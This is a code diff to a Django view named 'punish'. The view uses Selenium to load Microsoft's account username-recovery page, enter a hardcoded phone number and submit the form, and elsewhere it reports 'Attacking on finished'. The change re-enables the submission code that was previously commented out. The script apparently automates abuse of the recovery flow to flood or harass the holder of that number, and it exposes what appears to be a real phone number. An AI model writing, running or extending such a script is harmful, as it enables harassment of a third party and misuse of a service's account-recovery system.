@@ -57,11 +57,12 @@ def punish(request):
        return HttpResponse("<h2>Attacking on finished</h2>")
 
    driver.get("https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d16393%26mkt%3dEN-IN%26wa%3dwsignin1.0%26rpsnv%3d13%26rver%3d7.3.6963.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252fwww.microsoft.com%252fen-in%26lc%3d16393%26id%3d74335%26aadredir%3d1%26contextid%3dD7863DDDCB3736D9%26bk%3d1638344122%26uaid%3d91cf15d70bbe4c11ae57ce8b069c8047&id=74335&mkt=EN-IN&lc=16393&uaid=91cf15d70bbe4c11ae57ce8b069c8047&uiflavor=web")
-   print(driver.page_source)
+   #print(driver.page_source)
 
-   '''tf = driver.find_element('//*[@id="proofInputField"]')
-   tf.send_keys('7975847196')
+   tf = driver.find_element('//*[@id="proofInputField"]')
+   print(tf)
+   tf.send_keys("7975847196")
    sub = driver.find_element('//*[@id="enterProofNext"]')
-   sub.click()'''
+   sub.click()
 
    return render(request, 'CFP_Panel.html')
